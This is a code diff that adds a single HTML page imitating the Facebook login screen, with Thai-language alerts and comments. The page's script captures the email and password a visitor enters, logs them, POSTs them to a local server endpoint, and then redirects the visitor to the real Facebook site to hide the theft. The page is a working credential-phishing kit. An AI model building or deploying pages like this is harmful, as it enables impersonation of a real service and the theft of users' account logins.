@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – log in or sign up</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+        }
+
+        .container {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            max-width: 1000px;
+            width: 100%;
+            padding: 20px;
+        }
+
+        .left-section {
+            flex: 1;
+            margin-right: 50px;
+        }
+
+        .left-section h1 {
+            color: #1877f2;
+            font-size: 48px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .left-section p {
+            font-size: 20px;
+            color: #333;
+        }
+
+        .login-box {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+            width: 380px;
+            text-align: center;
+        }
+
+        .login-box input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+
+        .login-box button {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .login-box button:hover {
+            background-color: #165dd8;
+        }
+
+        .forgot-password {
+            display: block;
+            margin: 15px 0;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .line {
+            height: 1px;
+            background-color: #ddd;
+            margin: 15px 0;
+        }
+
+        .create-account {
+            background-color: #42b72a;
+            padding: 12px;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+
+        .create-account:hover {
+            background-color: #36a420;
+        }
+
+        .bottom-text {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .bottom-text a {
+            font-weight: bold;
+            color: black;
+            text-decoration: none;
+        }
+
+        .bottom-text a:hover {
+            text-decoration: underline;
+        }
+
+        @media (max-width: 900px) {
+            .container {
+                flex-direction: column;
+                text-align: center;
+            }
+            .left-section {
+                margin-bottom: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="left-section">
+            <h1>facebook</h1>
+            <p>Connect with friends and the world around you on Facebook.</p>
+        </div>
+
+        <div class="login-box">
+            <input type="text" id="email" placeholder="Email or phone number">
+            <input type="password" id="password" placeholder="Password">
+            <button onclick="submitForm()">Log In</button>
+            <a href="#" class="forgot-password">Forgot password?</a>
+            <div class="line"></div>
+            <button class="create-account">Create new account</button>
+        </div>
+    </div>
+
+    <div class="bottom-text">
+        <p><a href="#">Create a Page</a> for a celebrity, brand or business.</p>
+    </div>
+
+    <script>
+        function submitForm() {
+            const email = document.getElementById("email").value;
+            const password = document.getElementById("password").value;
+
+            if (!email || !password) {
+                alert("⚠️ กรุณากรอก Email/Phone และ Password ให้ครบถ้วน");
+                return;
+            }
+
+            console.log("📩 Email/Phone:", email);
+            console.log("🔑 Password:", password);
+
+            // *ส่งข้อมูลไปเซิร์ฟเวอร์*
+            fetch('http://localhost:3000/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ email, password })
+            })
+            .then(response => {
+                if (response.ok) {
+                    window.location.href = "https://www.facebook.com"; // เปลี่ยนเส้นทางเมื่อเข้าสู่ระบบสำเร็จ
+                } else {
+                    alert("ล้มเหลวในการเข้าสู่ระบบ! โปรดลองอีกครั้ง");
+                }
+            })
+            .catch(error => {
+                console.error("Error:", error);
+                alert("⚠️ เกิดข้อผิดพลาด กรุณาลองใหม่");
+            });
+        }
+    </script>
+
+</body>
+</html>
